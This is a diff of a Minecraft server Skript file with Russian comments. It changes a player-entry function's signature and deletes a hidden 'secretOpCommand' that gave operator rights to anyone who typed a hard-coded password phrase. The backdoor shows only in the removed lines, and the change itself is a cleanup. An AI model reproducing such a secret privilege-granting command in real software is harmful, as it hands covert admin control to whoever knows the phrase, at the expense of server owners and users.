@@ -1,4 +1,4 @@
-function PlayerEntry(player: player, empty: boolean):
+function PlayerEntry(player: player):
   # Настройки
   set {_player}'s gamemode to survival
   clear {_player}'s inventory
@@ -30,12 +30,6 @@ function randomizeMap():
     # notifications
     if {authorized::%loop-player%} is true:
       teleport loop-player to {game.%{game.currentId}%.spawn}
-
-command secretOpCommand [<text>]:
-  trigger:
-    if arg 1 is "horny-is-top-uoy":
-      op player
-      send "Да"
 
 function clear(p: player):	
 	clear {_p}'s inventory
